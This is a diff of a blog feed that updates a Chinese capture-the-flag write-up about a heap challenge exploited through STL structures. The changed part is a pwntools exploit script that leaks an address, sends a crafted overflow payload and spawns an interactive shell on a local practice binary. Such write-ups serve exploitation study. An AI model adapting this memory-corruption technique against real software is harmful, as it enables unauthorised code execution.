@@ -5,7 +5,7 @@
   <link href="https://dxfaker.top/" rel="alternate" type="text/html"/>
   <link href="https://dxfaker.top/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://dxfaker.top/</id>
-  <updated>2026-09-15T15:10:10.471Z</updated>
+  <updated>2026-09-15T15:12:08.996Z</updated>
   <language>en</language>
   <entry>
     <title>另类的STL利用的堆题</title>
@@ -236,25 +236,31 @@ func(badge);
 <p>下面是exp</p>
 <pre><code>from pwn import *
 
-context.binary = './pwn'
-p = process(['./libs/ld-linux-x86-64.so.2', '--library-path', './libs', './pwn'])
+context.arch = 'amd64'
+context.log_level = 'info'
 
-p.recvuntil(b'profile: ')
-profile = int(p.recvline().strip(), 16)  
+io = remote('127.0.0.1', 63944)
 
-payload = b'A' * 0x30                   
-payload += p64(profile + 0x48)          
-payload += p64(profile + 0x48)        
-payload += p64(profile + 0x50)           
+io.recvuntil(b'profile: ')
+profile = int(io.recvline().strip(), 16)
 
-p.send(payload)
+payload  = b'A' * 0x30
+payload += p64(profile)            
+payload += p64(profile + 0x48)     
+payload += p64(profile + 0x50)    
+assert len(payload) == 0x48
 
-p.recvuntil(b'win: ')
-win = int(p.recvline().strip(), 16)
-p.recvuntil(b'style data: ')
-p.sendline(str(win).encode())            
+io.recvuntil(b'name: ')
+io.send(payload)                 
 
-p.interactive()                
+io.recvuntil(b'win: ')
+win = int(io.recvline().strip(), 16)
+
+io.recvuntil(b'style data: ')
+io.sendline(str(win).encode())
+
+io.recvuntil(b'checking...')
+io.interactive()
 
 </code></pre>
 <p>初学好难搞，以至于将近一天我才好好参悟完一题(实则聊天看网课去了)</p>
